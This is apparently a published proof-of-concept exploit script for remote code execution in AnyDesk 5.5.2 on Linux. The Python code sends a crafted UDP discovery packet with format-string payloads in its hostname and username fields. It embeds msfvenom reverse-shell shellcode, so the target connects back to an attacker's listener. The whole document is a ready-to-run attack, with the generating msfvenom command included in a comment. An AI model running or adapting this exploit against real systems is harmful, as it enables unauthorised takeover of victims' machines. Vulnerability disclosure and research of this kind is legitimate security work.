# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.143.99' # CHANGE THIS
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""                                            
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"         
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x09\x04\xb7" 
shellcode += b"\xdb\xa1\xa5\xea\x42\x48\x31\x58\x27\x48\x2d"   
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x63\x2d\xef\x42\xcb" 
shellcode += b"\xa7\xb5\x28\x08\x5a\xb8\xde\xe9\x32\xa2\xfb"
shellcode += b"\x0b\x04\xa6\x87\xab\xac\xea\x30\x58\x4c\x3e"
shellcode += b"\x3d\xcb\xb5\xb0\x28\x23\x5c\xb8\xde\xcb\xa6"
shellcode += b"\xb4\x0a\xf6\xca\xdd\xfa\xf9\xaa\xef\x37\xff"
shellcode += b"\x6e\x8c\x83\x38\xed\x51\x6d\x6b\x6d\xd9\xf4"
shellcode += b"\xd2\xcd\xea\x11\x41\x8d\x50\x89\xf6\xed\x63"
shellcode += b"\xa4\x06\x01\xb7\xdb\xa1\xa5\xea\x42"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')